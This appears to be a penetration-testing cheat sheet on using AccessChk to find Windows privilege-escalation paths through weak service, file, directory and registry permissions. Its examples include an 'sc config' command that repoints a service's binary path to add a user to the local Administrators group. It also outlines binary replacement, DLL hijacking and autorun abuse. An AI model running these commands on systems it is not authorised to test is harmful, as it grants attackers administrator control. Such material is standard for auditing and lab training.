# AccessChk Cheat Sheet for Windows Privilege Escalation

## Overview

AccessChk is a Sysinternals tool used to enumerate permissions on Windows objects such as files, directories, services, and registry keys. It is extremely useful for identifying privilege escalation opportunities.

---

## Basic Syntax

```
accesschk64.exe [options] <object>
```

### Useful Flags

* `-u` → show access for a specific user/group
* `-v` → verbose output
* `-w` → show writable objects only
* `-c` → services
* `-d` → directories
* `-k` → registry keys
* `-q` → quiet (suppress banner)

---

## 1. Check Service Permissions

```
accesschk64.exe -wuvc <service_name>
```

### Look for:

* SERVICE_CHANGE_CONFIG
* SERVICE_ALL_ACCESS
* WRITE_DAC
* WRITE_OWNER

### Why:

Allows modifying service configuration (e.g., binPath → SYSTEM execution)

---

## 2. Enumerate Weak Service Permissions (All Services)

```
accesschk64.exe -uwcqv "Users" *
accesschk64.exe -uwcqv "Everyone" *
```

### Why:

Find services accessible by low-privileged users

---

## 3. Check Service Executable Permissions

```
accesschk64.exe -wv "C:\Path\to\service.exe"
```

### Look for:

* FILE_ALL_ACCESS
* FILE_GENERIC_WRITE
* MODIFY

### Why:

Writable binary → replace with malicious executable

---

## 4. Check Directory Permissions

```
accesschk64.exe -wvd "C:\Program Files\Some App"
```

### Why:

Writable directory may allow:

* binary replacement
* DLL hijacking

---

## 5. Check Service Registry Keys

```
accesschk64.exe -kvu "Users" HKLM\System\CurrentControlSet\Services\<service_name>
```

### Why:

Allows modification of ImagePath → execute malicious binary

---

## 6. Check Startup Folder

```
accesschk64.exe -wvd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

### Why:

Writable → place payload → executed at user login

---

## 7. Check Program Files

```
accesschk64.exe -wvd "C:\Program Files"
accesschk64.exe -wvd "C:\Program Files (x86)"
```

### Why:

Misconfigured app directories often lead to privilege escalation

---

## 8. Check Autorun Registry Keys

```
accesschk64.exe -kvu "Users" HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

### Why:

Writable autorun entries → code execution at startup

---

## 9. Target Specific User/Group

```
accesschk64.exe -wvu "Users" "C:\Path"
accesschk64.exe -wuvc "Users" <service_name>
```

---

## High-Value Findings

### Services

* SERVICE_CHANGE_CONFIG
* SERVICE_ALL_ACCESS

### Files

* FILE_ALL_ACCESS
* WRITE / MODIFY permissions

### Registry

* Write access to service keys
* Ability to change ImagePath

---

## Fast Workflow

### 1. Find weak services

```
accesschk64.exe -uwcqv "Users" *
```

### 2. Inspect service

```
accesschk64.exe -wuvc <service_name>
sc qc <service_name>
```

### 3. Check binary

```
accesschk64.exe -wv "C:\Path\to\binary.exe"
```

### 4. Check registry

```
accesschk64.exe -kvu "Users" HKLM\System\CurrentControlSet\Services\<service_name>
```

---

## Companion Commands

```
sc qc <service_name>
sc query <service_name>
whoami /priv
whoami /groups
icacls "C:\Path"
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service_name>
```

---

## Examples

### Service Config Abuse

```
accesschk64.exe -wuvc daclsvc
```

```
sc config daclsvc binpath= "cmd.exe /c net localgroup administrators user /add"
sc start daclsvc
```

### Writable Service Binary

```
accesschk64.exe -wv "C:\Program Files\App\service.exe"
```

### Writable Registry Key

```
accesschk64.exe -kvu "Users" HKLM\System\CurrentControlSet\Services\regsvc
```

---

## Common Pitfalls

* Writable service ≠ exploitable (need start/restart)
* Binary writable but service may not run as SYSTEM
* Directory writable ≠ guaranteed execution
* Always confirm execution context

---

## Must-Remember Commands

```
accesschk64.exe -wuvc <service_name>
accesschk64.exe -uwcqv "Users" *
accesschk64.exe -wv "C:\Path\to\binary.exe"
accesschk64.exe -wvd "C:\Program Files\App"
accesschk64.exe -kvu "Users" HKLM\System\CurrentControlSet\Services\<service_name>
```

---

## Summary

AccessChk helps identify privilege escalation paths by revealing weak permissions on services, files, and registry keys. The most critical findings are writable service configurations, modifiable service binaries, and writable registry paths controlling execution.
